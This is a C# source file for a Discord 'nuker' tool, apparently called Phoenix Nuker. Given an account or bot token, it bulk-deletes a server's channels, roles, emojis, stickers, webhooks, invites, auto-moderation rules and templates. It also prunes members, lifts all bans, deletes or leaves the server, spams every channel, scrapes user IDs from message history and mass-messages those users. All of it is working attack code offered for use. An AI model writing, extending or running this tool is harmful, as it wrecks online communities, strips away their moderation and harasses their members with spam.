using Leaf.xNet;
using Newtonsoft.Json.Linq;
using System;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading;

namespace nuker
{
    public class Server
    {
        public static string apiv = Config.APIVersion;
        public static int WaitTimeShort = Config.WaitTimeShort;
        public static int WaitTimeLong = Config.WaitTimeLong;

        public static void MsgInEveryChannel(string token, ulong? gid, string message)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{gid}/channels");
                    var array = JArray.Parse(request.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        if (entry.type == "0")
                        {
                            HttpClient client = new HttpClient();
                            client.DefaultRequestHeaders.Add("Authorization", token);
                            client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/channels/{entry.id}/messages");
                            client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
                            HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Post, $"https://discord.com/api/v{apiv}/channels/{entry.id}/messages");
                            request2.Content = new System.Net.Http.StringContent("{\"content\":\"" + message + "\"}", Encoding.UTF8, "application/json");
                            client.SendAsync(request2);
                            Thread.Sleep(WaitTimeShort);
                        }
                    }
                }
            }
            catch { }
        }

        public static void LeaveDeleteGuild(string token, ulong? gid, string owner)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    if (owner == "y")
                    {
                        req.AddHeader("Authorization", token);
                        req.Delete($"https://discord.com/api/v{apiv}/guilds/{gid}");
                        Thread.Sleep(WaitTimeShort);
                    }
                    else if (owner == "n")
                    {
                        req.AddHeader("Authorization", token);
                        req.Delete($"https://discord.com/api/v{apiv}/users/@me/guilds/{gid}");
                        Thread.Sleep(WaitTimeShort);
                    }
                }
            }
            catch { }
        }

        public static void ServerInformation(string token, ulong? gid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse serverinfo = req.Get($"https://discord.com/api/v{apiv}/guilds/{gid}");
                    var id = JObject.Parse(serverinfo.ToString())["id"];
                    var ownerid = JObject.Parse(serverinfo.ToString())["owner_id"].ToString();
                    var region = JObject.Parse(serverinfo.ToString())["region"].ToString();
                    var iconid = JObject.Parse(serverinfo.ToString())["icon"].ToString();
                    string avatar = $"https://cdn.discordapp.com/icons/{id}/{iconid}.webp";
                    var vanityurl = JObject.Parse(serverinfo.ToString())["vanity_url_code"].ToString();
                    req.Close();

                    Console.WriteLine("Server Information:\n");
                    Console.WriteLine($"ID: {id}\nOwner ID: {ownerid}\nRegion: {region}\nVanity Code: {vanityurl}\nAvatar: {avatar}");
                    Console.WriteLine("\nPress any key to go back.");
                    Console.ReadKey();
                    Console.Clear();
                }
            }
            catch { }
        }

        public static void CreateChannel(string token, ulong? gid, string name)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    HttpClient client = new HttpClient();
                    client.DefaultRequestHeaders.Add("Authorization", token);
                    client.DefaultRequestHeaders.Add("X-Audit-Log-Reason", "Phoenix Nuker");
                    client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/guilds/{gid}/channels");
                    client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
                    HttpRequestMessage request = new HttpRequestMessage(System.Net.Http.HttpMethod.Post, $"https://discord.com/api/v{apiv}/guilds/{gid}/channels");
                    request.Content = new System.Net.Http.StringContent("{\"name\":\"" + name + "\"}", Encoding.UTF8, "application/json");
                    client.SendAsync(request);
                    Thread.Sleep(WaitTimeShort);
                }
            }
            catch { }
        }

        public static void CreateRole(string token, ulong? gid, string name)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    HttpClient client = new HttpClient();
                    client.DefaultRequestHeaders.Add("Authorization", token);
                    client.DefaultRequestHeaders.Add("X-Audit-Log-Reason", "Phoenix Nuker");
                    client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/guilds/{gid}/roles");
                    client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
                    HttpRequestMessage request = new HttpRequestMessage(System.Net.Http.HttpMethod.Post, $"https://discord.com/api/v{apiv}/guilds/{gid}/roles");
                    request.Content = new System.Net.Http.StringContent("{\"name\":\"" + name + "\"}", Encoding.UTF8, "application/json");
                    client.SendAsync(request);
                    Thread.Sleep(WaitTimeShort);
                }
            }
            catch { }
        }

        public static void DeleteInvites(string token, ulong? gid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{gid}/invites");
                    var array = JArray.Parse(request.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        HttpClient client = new HttpClient();
                        client.DefaultRequestHeaders.Add("Authorization", token);
                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/invites/{entry.code}");
                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/invites/{entry.code}");
                        client.SendAsync(request2);
                        Console.WriteLine($"Deleted: {entry.code}");
                        Thread.Sleep(WaitTimeShort);
                    }
                }
            }
            catch { }
        }

        public static void DeleteEmojis(string token, ulong? gid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{gid}/emojis");
                    var array = JArray.Parse(request.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        HttpClient client = new HttpClient();
                        client.DefaultRequestHeaders.Add("Authorization", token);
                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/guilds/{gid}/emojis/{entry.id}");
                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/guilds/{gid}/emojis/{entry.id}");
                        client.SendAsync(request2);
                        Console.WriteLine($"Deleted: {entry.name}");
                        Thread.Sleep(WaitTimeShort);
                    }
                }
            }
            catch { }
        }

        public static void DeleteChannels(string token, ulong? gid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{gid}/channels");
                    var array = JArray.Parse(request.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        HttpClient client = new HttpClient();
                        client.DefaultRequestHeaders.Add("Authorization", token);
                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/channels/{entry.id}");
                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/channels/{entry.id}");
                        client.SendAsync(request2);
                        Console.WriteLine($"Deleted: {entry.name}");
                        Thread.Sleep(WaitTimeShort);
                    }
                }
            }
            catch { }
        }

        public static void RemoveBans(string token, ulong? gid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{gid}/bans");
                    var array = JArray.Parse(request.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        HttpClient client = new HttpClient();
                        client.DefaultRequestHeaders.Add("Authorization", token);
                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/guilds/{gid}/bans/" + entry.user["id"]);
                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/guilds/{gid}/bans/" + entry.user["id"]);
                        client.SendAsync(request2);
                        Console.WriteLine("Removed: " + entry.user["username"] + "#" + entry.user["discriminator"]);
                        Thread.Sleep(WaitTimeShort);
                    }
                }
            }
            catch { }
        }

        public static void DeleteRoles(string token, ulong? gid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{gid}/roles");
                    var array = JArray.Parse(request.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        HttpClient client = new HttpClient();
                        client.DefaultRequestHeaders.Add("Authorization", token);
                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/guilds/{gid}/roles/" + entry["id"]);
                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/guilds/{gid}/roles/" + entry["id"]);
                        client.SendAsync(request2);
                        Console.WriteLine("Deleted: " + entry["name"]);
                        Thread.Sleep(WaitTimeShort);
                    }
                }
            }
            catch { }
        }

        public static void DeleteStickers(string token, ulong? gid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{gid}/stickers");
                    var array = JArray.Parse(request.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        HttpClient client = new HttpClient();
                        client.DefaultRequestHeaders.Add("Authorization", token);
                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/guilds/{gid}/stickers/" + entry["id"]);
                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/guilds/{gid}/stickers/" + entry["id"]);
                        client.SendAsync(request2);
                        Console.WriteLine("Deleted: " + entry["name"]);
                        Thread.Sleep(WaitTimeShort);
                    }
                }
            }
            catch { }
        }

        public static string GetServerName(string token, ulong? gid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse servername = req.Get($"https://discord.com/api/v{apiv}/guilds/{gid}");
                    var name = JObject.Parse(servername.ToString())["name"];
                    req.Close();
                    return name.ToString();
                }
            }
            catch { return "N/A"; }
        }

        public static void PruneMembers(string token, ulong? gid)
        {
            try
            {
                HttpClient client = new HttpClient();
                client.DefaultRequestHeaders.Add("Authorization", token);
                client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/guilds/{gid}/prune");
                client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
                HttpRequestMessage request = new HttpRequestMessage(System.Net.Http.HttpMethod.Post, $"https://discord.com/api/v{apiv}/guilds/{gid}/prune");
                request.Content = new System.Net.Http.StringContent("{\"days\": 1}", Encoding.UTF8, "application/json");
                client.SendAsync(request);
            }
            catch { }
        }

        public static void RemoveIntegrations(string token, ulong? gid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{gid}/integrations");
                    var array = JArray.Parse(request.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        HttpClient client = new HttpClient();
                        client.DefaultRequestHeaders.Add("Authorization", token);
                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/guilds/{gid}/integrations/" + entry["id"]);
                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/guilds/{gid}/integrations/" + entry["id"]);
                        client.SendAsync(request2);
                        Console.WriteLine("Deleted: " + entry["name"]);
                        Thread.Sleep(WaitTimeShort);
                    }
                }
            }
            catch { }
        }

        public static void DeleteAllReactions(string token, ulong? cid, ulong? mid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    req.Delete($"https://discord.com/api/v{apiv}/channels/{cid}/messages/{mid}/reactions");
                }
            }
            catch { }
        }

        public static void GetIDs(string token, ulong? gid)
        {
            try
            {
                if (!File.Exists("ids.txt"))
                {
                    File.Create("ids.txt").Dispose();
                }

                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{gid}/channels");
                    var array = JArray.Parse(request.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        req.AddHeader("Authorization", token);
                        HttpResponse request2 = req.Get($"https://discord.com/api/v{apiv}/channels/{entry.id}/messages?limit=100");
                        var array2 = JArray.Parse(request2.ToString());
                        Console.WriteLine(array2);
                        Console.ReadKey();
                        req.Close();

                        foreach (dynamic entry2 in array2)
                        {
                            string id = entry2.author["id"];

                            if (!File.ReadAllLines("ids.txt").Contains(id))
                            {
                                File.AppendAllText("ids.txt", id + Environment.NewLine);
                            }
                        }
                    }
                }
            }
            catch { }
        }

        public static void ServerDM(string token, string message)
        {
            try
            {
                if (!File.Exists("dmed.txt"))
                {
                    File.Create("dmed.txt").Dispose();
                }
                string[] list = File.ReadAllLines("dmed.txt");
                foreach (var id in File.ReadAllLines("ids.txt"))
                {
                    HttpClient client = new HttpClient();
                    client.DefaultRequestHeaders.Add("Authorization", token);
                    client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/users/@me/channels");
                    client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
                    HttpRequestMessage request = new HttpRequestMessage(System.Net.Http.HttpMethod.Post, $"https://discord.com/api/v{apiv}/users/@me/channels");
                    request.Content = new System.Net.Http.StringContent($"{{\"recipient_id\":\"{id}\"}}", Encoding.UTF8, "application/json");
                    client.SendAsync(request).Wait();
                }
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse r3quest = req.Get($"https://discord.com/api/v{apiv}/users/@me/channels");
                    var array = JArray.Parse(r3quest.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        string id = entry.id;
                        if (!File.ReadAllLines("dmed.txt").Contains(id))
                        {
                            HttpClient client2 = new HttpClient();
                            client2.DefaultRequestHeaders.Add("Authorization", token);
                            client2.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/channels/{entry.id}/messages");
                            client2.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
                            HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Post, $"https://discord.com/api/v{Config.APIVersion}/channels/{entry.id}/messages");
                            request2.Content = new System.Net.Http.StringContent($"{{\"content\":\"{message}\"}}", Encoding.UTF8, "application/json");
                            client2.SendAsync(request2);
                            Console.WriteLine($"Messaged: {entry.recipients[0].username}#{entry.recipients[0].discriminator}");
                            Thread.Sleep(200);
                            File.AppendAllText("dmed.txt", id + Environment.NewLine);
                        }
                    }
                }
            }
            catch { }
        }


        public static void DeleteAutoModerationRules(string token, ulong? gid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{gid}/auto-moderation/rules");
                    var array = JArray.Parse(request.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        HttpClient client = new HttpClient();
                        client.DefaultRequestHeaders.Add("Authorization", token);
                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/guilds/{gid}/auto-moderation/rules/" + entry["id"]);
                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/guilds/{gid}/auto-moderation/rules/" + entry["id"]);
                        client.SendAsync(request2);
                        Console.WriteLine("Deleted: " + entry["name"]);
                        Thread.Sleep(WaitTimeShort);
                    }
                }
            }
            catch { }
        }

        public static void CreateInvite(string token, ulong? gid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{gid}/channels");
                    var array = JArray.Parse(request.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        HttpClient client = new HttpClient();
                        client.DefaultRequestHeaders.Add("Authorization", token);
                        client.DefaultRequestHeaders.Add("X-Audit-Log-Reason", "Phoenix Nuker");
                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/channels/{entry.id}/invites");
                        client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Post, $"https://discord.com/api/v{apiv}/channels/{entry.id}/invites");
                        request2.Content = new System.Net.Http.StringContent($"{{\"max_age\": 0}}", Encoding.UTF8, "application/json");
                        client.SendAsync(request2).Wait();
                        Thread.Sleep(WaitTimeShort);
                    }
                }
            }
            catch { }
        }

        public static void DeleteGuildScheduledEvents(string token, ulong? gid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{gid}/scheduled-events");
                    var array = JArray.Parse(request.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        HttpClient client = new HttpClient();
                        client.DefaultRequestHeaders.Add("Authorization", token);
                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/guilds/{gid}/scheduled-events/{entry.id}");
                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/guilds/{gid}/scheduled-events/{entry.id}");
                        client.SendAsync(request2).Wait();
                        Console.WriteLine("Deleted: " + entry["name"]);
                        Thread.Sleep(WaitTimeShort);
                    }
                }
            }
            catch { }
        }

        public static void DeleteGuildTemplate(string token, ulong? gid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{gid}/templates");
                    var array = JArray.Parse(request.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        HttpClient client = new HttpClient();
                        client.DefaultRequestHeaders.Add("Authorization", token);
                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/guilds/{gid}/templates/{entry.code}");
                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/guilds/{gid}/templates/{entry.code}");
                        client.SendAsync(request2).Wait();
                        Console.WriteLine("Deleted: " + entry["name"]);
                        Thread.Sleep(WaitTimeShort);
                    }
                }
            }
            catch { }
        }

        public static void DeleteStageInstances(string token, ulong? gid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{gid}/channels");
                    var array = JArray.Parse(request.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        HttpClient client = new HttpClient();
                        client.DefaultRequestHeaders.Add("Authorization", token);
                        client.DefaultRequestHeaders.Add("X-Audit-Log-Reason", "Phoenix Nuker");
                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/stage-instances/{entry.id}");
                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/stage-instances/{entry.id}");
                        client.SendAsync(request2).Wait();
                        Thread.Sleep(WaitTimeShort);
                    }
                }
            }
            catch { }
        }

        public static void DeleteWebhooks(string token, ulong? gid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{gid}/webhooks");
                    var array = JArray.Parse(request.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        HttpClient client = new HttpClient();
                        client.DefaultRequestHeaders.Add("Authorization", token);
                        client.DefaultRequestHeaders.Add("X-Audit-Log-Reason", "Phoenix Nuker");
                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/webhooks/{entry.id}");
                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/webhooks/{entry.id}");
                        client.SendAsync(request2).Wait();
                        Console.WriteLine("Deleted: " + entry["name"]);
                        Thread.Sleep(WaitTimeShort);
                    }
                }
            }
            catch { }
        }

        public static void DeleteWebhook(string token, ulong? wid)
        {
            try
            {
                HttpClient client = new HttpClient();
                client.DefaultRequestHeaders.Add("Authorization", token);
                client.DefaultRequestHeaders.Add("X-Audit-Log-Reason", "Phoenix Nuker");
                client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/webhooks/{wid}");
                HttpRequestMessage request = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/webhooks/{wid}");
                client.SendAsync(request).Wait();
                Console.WriteLine("Done");
                Thread.Sleep(2000);
            }
            catch { }
        }
    }
}
